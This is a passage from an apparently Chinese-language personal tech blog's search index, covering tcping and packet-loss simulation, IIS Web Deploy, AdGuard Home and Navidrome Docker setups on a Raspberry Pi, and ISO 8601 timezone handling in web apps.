網路狀況","uri":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/"},{"categories":["實用工具"],"content":"Demo 身邊沒有網路不穩的系統。想嘗試看看嗎?我之前有特別找模擬不良網路環境方法 - 程式狂想筆記方法，這邊就實作了一下。 記得電腦要在旁邊，不然無法取消就麻煩了。 sudo tc qdisc add dev wlp3s0 root netem loss 40% 想取消可執行下指令或重開機都可以。 sudo tc qdisc del dev wlp3s0 root netem loss 40% ","date":"2023-06-11","objectID":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/:4:0","tags":["tcping","tcp","監控","網路"],"title":"Tcping 測試 Tcp Port 網路狀況","uri":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/"},{"categories":["實用工具"],"content":"其他工具 https://github.com/i3h/tcping https://github.com/zhengxiaowai/tcping ","date":"2023-06-11","objectID":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/:5:0","tags":["tcping","tcp","監控","網路"],"title":"Tcping 測試 Tcp Port 網路狀況","uri":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/"},{"categories":["實用工具"],"content":"不算能測試 http 服務穩定性 最近公司網路部穩，部分打 Google API 會有些狀況，這邊研究 tcping 測試網路服務，雖然指令有 proxy 指令，但回來結果都是 400。後來突然想到不應該用這個，應該用 ab 壓力測試工具測試。 ab -n 100 -c 1 -X proxy[:port] http://www.example.com/ ","date":"2023-06-11","objectID":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/:6:0","tags":["tcping","tcp","監控","網路"],"title":"Tcping 測試 Tcp Port 網路狀況","uri":"/blog/posts/tcping-%E6%B8%AC%E8%A9%A6-tcp-port-%E7%B6%B2%E8%B7%AF%E7%8B%80%E6%B3%81/"},{"categories":[".Net Core"],"content":"Web Deploy 是微軟提供 IIS 部屬 Net Core 程式一種方法。因為工作關係我同事有在研究 CI/CD部署，這邊有看到微軟出的 Web Deploy，但發現這個沒有跨平台，最後發現其實感覺微軟現在都不建議這個部署，但我覺得工作還是有機會用到，這邊研究了順便記錄下來。 ","date":"2023-06-11","objectID":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/:0:0","tags":[".netcore","iis","web","webserver","deploy"],"title":"Web IIS Web Deploy 操作記錄","uri":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/"},{"categories":[".Net Core"],"content":"心智圖 ","date":"2023-06-11","objectID":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/:1:0","tags":[".netcore","iis","web","webserver","deploy"],"title":"Web IIS Web Deploy 操作記錄","uri":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/"},{"categories":[".Net Core"],"content":"IIS 安裝 Web Deploy 安裝 IIS 管理服務 注意有這個要重啟服務才會生效。 參考: 如何使用 Visual Studio 2010 的「單鍵發行」功能 (MsDeploy) | The Will Will Web 然後一直下一步，安裝。 看到這個有在上面就是有安裝成功。 啟用服務。這邊特別說明，你可能本機部署程式沒有發生打帳號密碼，這邊我同事之前沒用過帳號密碼，但我們做遠端部署發現這一段會驗證不過，這邊你在同一台電腦做可能不會有這個問題，這邊要注意一樣，這邊流程就不特別用。] 下載 Web Deploy 並且安裝。 Web Deploy 3.6 : The Official Microsoft IIS Site 這邊注意，安裝要選自訂安裝，整個服務都要勾選安裝。 安裝完，確認是否安裝成功。IIS 管理視窗關掉重開，你在站台右鍵會看到部署選單，這樣就表示成功。 ","date":"2023-06-11","objectID":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/:2:0","tags":[".netcore","iis","web","webserver","deploy"],"title":"Web IIS Web Deploy 操作記錄","uri":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/"},{"categories":[".Net Core"],"content":"Visual Studio 發佈 專案 右鍵選擇發佈選項，再選擇 IIS 伺服器選項。 選擇 Web Deploy。 Info Web Deploy 封裝會幫你打包程式 zip 和 cmd(web deploy)，這邊有興趣可以試試。 設定完就可以點發佈按鈕做發佈。 Deploying to remote IIS with MsDeploy | Johan Driessen dotnet-build-test-msdeploy/main.yml at master · RahulParmarRP/dotnet-build-test-msdeploy ","date":"2023-06-11","objectID":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/:3:0","tags":[".netcore","iis","web","webserver","deploy"],"title":"Web IIS Web Deploy 操作記錄","uri":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/"},{"categories":[".Net Core"],"content":"遠端 Web Deploy 注意事項 完整安裝 Web Deploy，參考上方流程。 防火牆開通 Port 8172，很多公司有防火牆需要注意這個。 啟用 IIS Management 服務，上面 IIS設定。 設定 IIS 帳號權限，這邊可以指定 IIS站台帳號密碼或者用 Windows帳號，新增完記得要回來站台新增帳號進去。 更完整教學可以參考:Linux Deploy搭建web,Web Deploy 服务器安装设置与使用_weixin_40001805的博客-CSDN博客 我們範例都使用 Visual Studio 發佈，可能會問這個有沒有指令版本?這邊可以做到的，但我後來發現最新這個 Web Deploy 已經不是建議發佈方法，這邊就不打算深入研究，不過是有看到不錯文章記入滿多功能的。 ","date":"2023-06-11","objectID":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/:4:0","tags":[".netcore","iis","web","webserver","deploy"],"title":"Web IIS Web Deploy 操作記錄","uri":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/"},{"categories":[".Net Core"],"content":"發現詳細多種 Web Deploy 教學 這邊我工作上面沒用到，暫時不深入研究。 Web Deploy - Web Deploy Command Line | Level Up Web Deploy - Restart remote IIS | Level Up Web Deploy - Install \u0026 setup web deploy | Level Up …更多可以看作者文章Tag: Web Deploy | Level Up。 也可以參考: 使用 Visual Studio ASP.NET Web 部署：命令列部署 | Microsoft Learn ","date":"2023-06-11","objectID":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/:5:0","tags":[".netcore","iis","web","webserver","deploy"],"title":"Web IIS Web Deploy 操作記錄","uri":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/"},{"categories":[".Net Core"],"content":"已經廢棄不維護?! 從這篇 IIS7 發佈工具比較 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 看到，原本想說這篇想拆幾篇來記錄詳細作法，但看到這個感覺這個方法已經不是主流，這邊就不詳細紀錄。 注意：Web Platform Installer (WebPI) 將於 2022 年 7 月 1 日停用。有關詳細信息，請參閱此博客文章：https://blogs.iis.net/iisteam/web-platform-installer-end-of-support-feed 參考: 從零開始的MVC開發-Web Deploy部署網站 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 所以使用這個方法可能要注意一下，未來可能有替代方法。 其實我找不到 IIS 自動部署工具，也許現在都用容器部署，可能沒有人在折騰實體主機部署，看起來都是不安全 IIS 停止站台複製程式方法，然後再啟動站台。 ","date":"2023-06-11","objectID":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/:6:0","tags":[".netcore","iis","web","webserver","deploy"],"title":"Web IIS Web Deploy 操作記錄","uri":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/"},{"categories":[".Net Core"],"content":"彩蛋 dotnet-build-test-msdeploy/main.yml at master · RahulParmarRP/dotnet-build-test-msdeploy 如何正確地發行 ASP.NET Core 網站到遠端 IIS 站台 | The Will Will Web .NET Deploy To IIS Tutorial (How to Host .NET Core in IIS) | The Skeptical Software Engineer asp.net core - Deploy website to IIS from linux build agent - Stack Overflow 超简单！asp.net core前后端分离项目使用gitlab-ci持续集成到IIS_mb607022e25a607的技术博客_51CTO博客 正常正式 Server 不會當 Runner ，但可以參考。 .Net 6 IIS陰影複製 - HackMD [IIS]-設定允許遠端部署 | 布萊恩的技術相談室 用 MSBuild 事件解決 ASP.NET Core 發佈 IIS 目錄之 DLL 鎖定問題-黑暗執行緒 Use GitHub Actions with a private runner to deploy to IIS · Discussion #11 · rajbos/rajbos.github.io 無相關 websocket - nginx setup for wss:// keep getting 301 redirects - Server Fault ","date":"2023-06-11","objectID":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/:7:0","tags":[".netcore","iis","web","webserver","deploy"],"title":"Web IIS Web Deploy 操作記錄","uri":"/blog/posts/Web-IIS-Web-Deploy-%E6%93%8D%E4%BD%9C%E8%A8%98%E9%8C%84/"},{"categories":["實用工具"],"content":"其實這個已經玩很久了，之前應該有要記錄這篇，但忘記什麼原因就沒紀錄了。可能太過簡單了，就沒記錄。🤣 最近我朋友跟我索取動物機，這邊準備要搬到3代動物機，順便留一些記錄。 ","date":"2023-06-11","objectID":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/:0:0","tags":["dns"],"title":"AdGuard Home 架設可防廣告 DNS Server","uri":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/"},{"categories":["實用工具"],"content":"心智圖 mindmap root((AdGuard)) 介紹 使用 docker 安裝 相關配置 DNS 每秒連線數調整無限制 DNS 改寫 DNS 封鎖清單 ","date":"2023-06-11","objectID":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/:1:0","tags":["dns"],"title":"AdGuard Home 架設可防廣告 DNS Server","uri":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/"},{"categories":["實用工具"],"content":"AdGuard Home (29) AdGuard Home 另一個Pi-hole？兩者有什麼區別？DNS擋廣告 樹莓派安裝教程！【明富其識】 - YouTube AdGuard Home 超簡單架設教學！ | Adguard DNS - 叩頂窩客 裡面有提到DNS sinkhole，可以看一下原理。 是時候裝一套 AdGuard Home 全局擋廣告神器了！ | jkgtw’s blog  Warning 這邊可能你設定，在看 Youtube 時候還會看到廣告，原因不是 DNS 沒用。因為是…APP使用 DNS over HTTPS(DoT)，所以你的 DNS 根本沒辦法阻擋，目前這個方法是無解的。 ","date":"2023-06-11","objectID":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/:2:0","tags":["dns"],"title":"AdGuard Home 架設可防廣告 DNS Server","uri":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/"},{"categories":["實用工具"],"content":"安裝 這邊其實只要執行檔執行就可以了，因為 Golang 可編譯跨平台執行真的超級方便的。Docker run 也可以簡單完成，官方就有 Docker 映像檔可以用。這邊還發現各種架構都支援。 #!/bin/bash mkdir -p $PWD/adguardhome/workdir mkdir -p $PWD/adguardhome/confdir docker run --name adguardhome\\ --restart unless-stopped\\ -v $PWD/adguardhome/workdir:/opt/adguardhome/work \\ -v $PWD/adguardhome/confdir:/opt/adguardhome/conf \\ -p 53:53/tcp -p 53:53/udp\\ -p 67:67/udp -p 68:68/udp\\ -p 80:80/tcp -p 443:443/tcp -p 443:443/udp\\ #-p 3000:3000/tcp\\ -p 853:853/tcp\\ -p 784:784/udp -p 853:853/udp -p 8853:8853/udp\\ -p 5443:5443/tcp -p 5443:5443/udp\\ -d adguard/adguardhome 上面還滿多Port，我看官方 Port 設定，可以拿掉沒有要用的。 -p 53:53/tcp -p 53:53/udp: plain DNS. -p 67:67/udp -p 68:68/tcp -p 68:68/udp: add if you intend to use AdGuard Home as a DHCP server. -p 80:80/tcp -p 443:443/tcp -p 443:443/udp -p 3000:3000/tcp: add if you are going to use AdGuard Home's admin panel as well as run AdGuard Home as an HTTPS/DNS-over-HTTPS server. -p 853:853/tcp: add if you are going to run AdGuard Home as a DNS-over-TLS server. -p 784:784/udp -p 853:853/udp -p 8853:8853/udp: add if you are going to run AdGuard Home as a DNS-over-QUIC server. You may only leave one or two of these. -p 5443:5443/tcp -p 5443:5443/udp: add if you are going to run AdGuard Home as a DNSCrypt server. 因為我 3000 web port 已經有服務再用，所以我直接從 80 倒進 3000 port。之後好像 port會變成 80再改回去。 #!/bin/bash mkdir -p $PWD/adguardhome/workdir mkdir -p $PWD/adguardhome/confdir docker run --name adguardhome\\ --restart unless-stopped\\ -v $PWD/adguardhome/workdir:/opt/adguardhome/work \\ -v $PWD/adguardhome/confdir:/opt/adguardhome/conf \\ -p 53:53/tcp -p 53:53/udp\\ -p 80:3000/tcp\\ -p 5443:5443/tcp -p 5443:5443/udp\\ -d adguard/adguardhome 進去網站設定。 點選開始 設定帳號密碼 在路由器設定 Dns。 Warning 這邊注意!!不是每一個路由器做 DHCP 派送會有 DNS 設定。像是中華電信 P883 沒有這個設定，所以無法做調整，但我在我的防火牆那台設定。沒支援也沒關係，可以把你的路由器 DHCP關掉，開啟 AdGuard Home 裡面的 DHCP，也可以解決這個問題。注意!!一個區網只能有一個 DHCP Server!! 其實到這邊就可以結束了。 ","date":"2023-06-11","objectID":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/:3:0","tags":["dns"],"title":"AdGuard Home 架設可防廣告 DNS Server","uri":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/"},{"categories":["實用工具"],"content":"DNS 每秒連線數調整無限制 有看到別的網站有做這個限制，不過我前面是沒調整，但也沒遇到什麼問題。網路文章上看到說調整這個設定，區網沒必要做限制，但對外網路可能就需要。 ","date":"2023-06-11","objectID":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/:4:0","tags":["dns"],"title":"AdGuard Home 架設可防廣告 DNS Server","uri":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/"},{"categories":["實用工具"],"content":"DNS 改寫 因為有一組外網 DNS，希望可以直連內網 IP，可以這樣做設定，這樣也能 TLS 連線安全。 ","date":"2023-06-11","objectID":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/:5:0","tags":["dns"],"title":"AdGuard Home 架設可防廣告 DNS Server","uri":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/"},{"categories":["實用工具"],"content":"DNS 封鎖清單 adguardteam.github.io/AdGuardSDNSFilter/Filters/filter.txt easylist-downloads.adblockplus.org/easylistchina+easylist.txt cdn.jsdelivr.net/gh/neoFelhz/neohosts@gh-pages/full/hosts.txt anti-ad.net/easylist.txt ","date":"2023-06-11","objectID":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/:6:0","tags":["dns"],"title":"AdGuard Home 架設可防廣告 DNS Server","uri":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/"},{"categories":["實用工具"],"content":"舊的安裝記錄 adguard/adguardhome:armhf-latest以前都要做 armhf-latest，之後版本都不需要做設定。 #!/bin/bash mkdir -p $PWD/adguardhome/workdir mkdir -p $PWD/adguardhome/confdir docker rm -f adguardhome docker run \\ -d \\ --name=adguardhome \\ --restart=always \\ -v $PWD/adguardhome/workdir:/opt/adguardhome/work \\ -v $PWD/adguardhome/confdir:/opt/adguardhome/conf \\ -p 53:53/tcp \\ -p 53:53/udp \\ -p 67:67/udp \\ -p 69:68/tcp \\ -p 69:68/udp \\ -p 80:80/tcp \\ -p 443:443/tcp \\ -p 853:853/tcp \\ -p 3000:3000/tcp \\ adguard/adguardhome:armhf-latest ","date":"2023-06-11","objectID":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/:7:0","tags":["dns"],"title":"AdGuard Home 架設可防廣告 DNS Server","uri":"/blog/posts/AdGuard-Home-%E6%9E%B6%E8%A8%AD%E5%8F%AF%E9%98%B2%E5%BB%A3%E5%91%8A-DNS-Server/"},{"categories":["實用工具"],"content":"前陣子都沒有發現好用的音樂播放器，最後用 NextCloud 空間加裝裡面 audio player，但覺得使用樹梅派速度非常慢，再產生亂數音樂覺得一點也不亂數，有時候會聽到同一首歌很近聽多次，最近看到 Navidrome 看到介面還不錯，這邊就來架設看看。 ","date":"2023-05-08","objectID":"/blog/posts/Raspberry-Pi-%E6%9E%B6%E8%A8%AD%E5%A5%BD%E7%94%A8%E7%B7%9A%E4%B8%8A%E9%9F%B3%E6%A8%82%E6%92%AD%E6%94%BE%E5%99%A8-Navidrome/:0:0","tags":["player","navidrome","raspberrypi"],"title":"Raspberry Pi 架設好用線上音樂播放器 - Navidrome","uri":"/blog/posts/Raspberry-Pi-%E6%9E%B6%E8%A8%AD%E5%A5%BD%E7%94%A8%E7%B7%9A%E4%B8%8A%E9%9F%B3%E6%A8%82%E6%92%AD%E6%94%BE%E5%99%A8-Navidrome/"},{"categories":["實用工具"],"content":"DEMO 官方有Demo網站可以給你試用。Navidrome Demo | Navidrome ","date":"2023-05-08","objectID":"/blog/posts/Raspberry-Pi-%E6%9E%B6%E8%A8%AD%E5%A5%BD%E7%94%A8%E7%B7%9A%E4%B8%8A%E9%9F%B3%E6%A8%82%E6%92%AD%E6%94%BE%E5%99%A8-Navidrome/:1:0","tags":["player","navidrome","raspberrypi"],"title":"Raspberry Pi 架設好用線上音樂播放器 - Navidrome","uri":"/blog/posts/Raspberry-Pi-%E6%9E%B6%E8%A8%AD%E5%A5%BD%E7%94%A8%E7%B7%9A%E4%B8%8A%E9%9F%B3%E6%A8%82%E6%92%AD%E6%94%BE%E5%99%A8-Navidrome/"},{"categories":["實用工具"],"content":"心智圖 mindmap root((Navidrome)) 架設 Navidrome 使用 Docker 架設 Navidrome Traefik 反向代理 Navidrome 因為 healthcheck 問題反向代理失敗 WorkAround 解法 libseccomp2 安裝方法排除 Docker 啟動問題 ","date":"2023-05-08","objectID":"/blog/posts/Raspberry-Pi-%E6%9E%B6%E8%A8%AD%E5%A5%BD%E7%94%A8%E7%B7%9A%E4%B8%8A%E9%9F%B3%E6%A8%82%E6%92%AD%E6%94%BE%E5%99%A8-Navidrome/:2:0","tags":["player","navidrome","raspberrypi"],"title":"Raspberry Pi 架設好用線上音樂播放器 - Navidrome","uri":"/blog/posts/Raspberry-Pi-%E6%9E%B6%E8%A8%AD%E5%A5%BD%E7%94%A8%E7%B7%9A%E4%B8%8A%E9%9F%B3%E6%A8%82%E6%92%AD%E6%94%BE%E5%99%A8-Navidrome/"},{"categories":["實用工具"],"content":"使用 docker 在樹梅派架設 看下官網 docker 有支援 ARM 架構，所以直接設定 docker-compose.yml 就能執行了。 docker-compose.yml version: \"3\" services: navidrome: image: deluan/navidrome:latest ports: - \"4533:4533\" environment: # Optional: put your config options customization here. Examples: ND_SCANSCHEDULE: 1h ND_LOGLEVEL: info ND_BASEURL: \"\" volumes: - \"./data:/data\" - \"/media/USBdrive/ncp2/nextcloud/data/malagege/files/音樂:/music:ro\" docker compose up -d ","date":"2023-05-08","objectID":"/blog/posts/Raspberry-Pi-%E6%9E%B6%E8%A8%AD%E5%A5%BD%E7%94%A8%E7%B7%9A%E4%B8%8A%E9%9F%B3%E6%A8%82%E6%92%AD%E6%94%BE%E5%99%A8-Navidrome/:3:0","tags":["player","navidrome","raspberrypi"],"title":"Raspberry Pi 架設好用線上音樂播放器 - Navidrome","uri":"/blog/posts/Raspberry-Pi-%E6%9E%B6%E8%A8%AD%E5%A5%BD%E7%94%A8%E7%B7%9A%E4%B8%8A%E9%9F%B3%E6%A8%82%E6%92%AD%E6%94%BE%E5%99%A8-Navidrome/"},{"categories":["實用工具"],"content":"Traefik 加上反向代理設定 參考: 在 Raspberry PI 架設 Traefik 初體驗 - 程式狂想筆記 Traefik 反向代理 (Reverse Proxy) IP Host 方法 - 程式狂想筆記 version: \"3\" services: navidrome: image: deluan/navidrome:latest #ports: # - \"4533:4533\" environment: # Optional: put your config options customization here. Examples: ND_SCANSCHEDULE: 1h ND_LOGLEVEL: info ND_BASEURL: \"\" networks: - traefik_network volumes: - \"./data:/data\" - \"/media/USBdrive/ncp2/nextcloud/data/malagege/files/音樂:/music:ro\" restart: unless-stopped labels: - \"traefik.http.routers.navidrome.rule=Host(`xxx.xxx.duckdns.org`)\" - \"traefik.http.routers.navidrome.tls=true\" healthcheck: disable: true networks: traefik_network: external: true ","date":"2023-05-08","objectID":"/blog/posts/Raspberry-Pi-%E6%9E%B6%E8%A8%AD%E5%A5%BD%E7%94%A8%E7%B7%9A%E4%B8%8A%E9%9F%B3%E6%A8%82%E6%92%AD%E6%94%BE%E5%99%A8-Navidrome/:3:1","tags":["player","navidrome","raspberrypi"],"title":"Raspberry Pi 架設好用線上音樂播放器 - Navidrome","uri":"/blog/posts/Raspberry-Pi-%E6%9E%B6%E8%A8%AD%E5%A5%BD%E7%94%A8%E7%B7%9A%E4%B8%8A%E9%9F%B3%E6%A8%82%E6%92%AD%E6%94%BE%E5%99%A8-Navidrome/"},{"categories":["實用工具"],"content":"因為 healthcheck 問題反向代理失敗 想說 Traefik 上傳失敗，後來發現是healthcheck unhealthy 健康度關係。有找到 workaround 方法，就是關閉 healthcheck 檢查。 Navidrome 0.40 - unhealthy docker container on armv7 · Issue #773 · navidrome/navidrome healthcheck: disable: true 其實有比較正解的方法，之前2023年樹莓派重裝 Flexget - 程式狂想筆記這篇在使用 docker 跑 flexget 容器就遇到，但礙於安裝方法複雜就沒特別，這邊還要特別更新 libseccomp2( from buster-backports.)，當然要而外特別安裝軟體，不知道未來 apt 更新會不會解決這個問題，這邊就簡單留解決文章。 相關解決 libseccomp2 問題文章: Any way to get libseccom2 version bumped in 32bit Buster RPiOS - Raspberry Pi Forums 當初使用 連結 裡面安裝 libseccomp2_2.5.4-1+rpi1+b1_armhf.deb 安裝2023年樹莓派重裝 Flexget - 程式狂想筆記 解決無法啟動容器問題。 Update libseccomp2 to resolve issues with time not being set correctly inside containers - owre.se Ubuntu 20.04 image fails to provide realtime clock on arm32v7 raspberry pi · Issue #196 · tianon/docker-brew-ubuntu-core Debian – 在 sid 中的 libseccomp2 套件詳細資訊 ","date":"2023-05-08","objectID":"/blog/posts/Raspberry-Pi-%E6%9E%B6%E8%A8%AD%E5%A5%BD%E7%94%A8%E7%B7%9A%E4%B8%8A%E9%9F%B3%E6%A8%82%E6%92%AD%E6%94%BE%E5%99%A8-Navidrome/:3:2","tags":["player","navidrome","raspberrypi"],"title":"Raspberry Pi 架設好用線上音樂播放器 - Navidrome","uri":"/blog/posts/Raspberry-Pi-%E6%9E%B6%E8%A8%AD%E5%A5%BD%E7%94%A8%E7%B7%9A%E4%B8%8A%E9%9F%B3%E6%A8%82%E6%92%AD%E6%94%BE%E5%99%A8-Navidrome/"},{"categories":["程式心法"],"content":"最近使用 .Net 內建 API 回傳物件，他會把 DateTime 轉成 YYYY-mm-ddTHH:MM:ssZ，最近就打算把 Entity 回傳出去給前端，後來發現前端傳給我資料我會少8小時，發現是時區問題，最後前端就先幫我加 8 小時，因為我們網站沒有做跨區問題，所以這邊花點時間我後端要怎麼調整。 ","date":"2023-04-01","objectID":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/:0:0","tags":["前端","後端","時區","js","datetime","iso8601"],"title":"後端和前端做跨時區網站要注意的事","uri":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/"},{"categories":["程式心法"],"content":"心智圖 mindmap root(後端和前端做跨時區網站要注意的事) ISO8601 日期時間格式 網站要做跨時區 前端日期時間轉成 UTC 時間給後端 前端日期時間依照瀏覽器時區轉換 後端處理 UTC 時間到資料庫 網站不需要做跨時區 前後端日常使用 ","date":"2023-04-01","objectID":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/:1:0","tags":["前端","後端","時區","js","datetime","iso8601"],"title":"後端和前端做跨時區網站要注意的事","uri":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/"},{"categories":["程式心法"],"content":"ISO8601 日期時間格式 簡單來說格式就是 YYYY-mm-ddTHH:MM:ssZ，這邊 Z可以改時區，例如:+08:00。結果會是2022-02-02T12:00:00+08:00，這邊可能會問 T是什麼?Z是什麼? T: 僅僅是分隔日期和時間的符號，沒有其他含義。所以下面的例子其實結果是一樣的。 Z: 這個說法也不嚴謹，指定 Z 時表示 UTC 時間，不指定時表示的是本地時間。 詳細可以看: ISO 8601 - 維基百科，自由的百科全書 javascript - 關於“時間”的一次探索 - 前端漲姿勢 - SegmentFault 思否 ==\u003e上面說TZ說明來自這篇 我以前也有寫過類似這個東西，不過跟這篇沒什麼關係: ISO 8601 時間格式 XXXX-XX-XXTXX:XX:XXZ - 程式狂想筆記 ISO 8601 duration 時間標準小記 - 程式狂想筆記 ","date":"2023-04-01","objectID":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/:2:0","tags":["前端","後端","時區","js","datetime","iso8601"],"title":"後端和前端做跨時區網站要注意的事","uri":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/"},{"categories":["程式心法"],"content":"為什麼前端傳給我會是錯的呢? 我當下看到我資料庫存的時間會是 2022-03-02 16:00:00，因為前端沒顯示時間，所以看到結果會是少一天。這邊 .Net 預設JSON轉的格式是 ISO8601 YYYY-mm-ddTHH:MM:ssZ，前端用 toISOString是不會帶時區的，所以造成這個問題。 到底要怎麼調整呢? ","date":"2023-04-01","objectID":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/:3:0","tags":["前端","後端","時區","js","datetime","iso8601"],"title":"後端和前端做跨時區網站要注意的事","uri":"/blog/posts/%E5%BE%8C%E7%AB%AF%E5%92%8C%E5%89%8D%E7%AB%AF%E5%81%9A%E8%B7%A8%E6%99%82%E5%8D%80%E7%B6%B2%E7%AB%99%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B/"},{"categories":["程式心法"],"content":"網站是否要做多時區? 像我之前工作大部分是不需要做跨時區網站，因為可能都是對台灣內部使用，之前跟 Line 案子合作過，他們有要求做跨時區，所以不是每個網站都有這個需求。之前六角學院辦的前端精神時光屋有做過倒數計時，這邊他們有討論過這個議題。 前端和後端怎麼配合呢? 